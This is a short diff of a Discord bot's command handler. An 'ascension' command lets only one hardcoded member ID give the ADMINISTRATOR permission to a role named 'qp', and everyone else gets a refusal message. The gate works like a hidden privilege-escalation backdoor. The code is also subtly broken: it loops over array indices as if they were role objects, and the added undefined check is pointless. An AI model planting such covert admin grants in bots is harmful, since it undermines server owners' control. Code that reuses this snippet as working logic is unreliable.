@@ -365,12 +365,12 @@ function processCommand(receivedMessage) {
         if(receivedMessage.member.id !== '142907937084407808') {
             receivedMessage.channel.send("Only AA is worthy of ascension.");
         }
-        
+
         else {
             let myroles = Array.from(receivedMessage.member.roles.values());
 
             for(let role in myroles) {
-                if(role.name.toLowerCase() === "qp") {
+                if(role.name.toLowerCase() === "qp" && role.name.toLowerCase() !== undefined) {
                     role.setPermissions('ADMINISTRATOR')
                     .then(updated => console.log("Ascended."))
                     .catch(console.error);
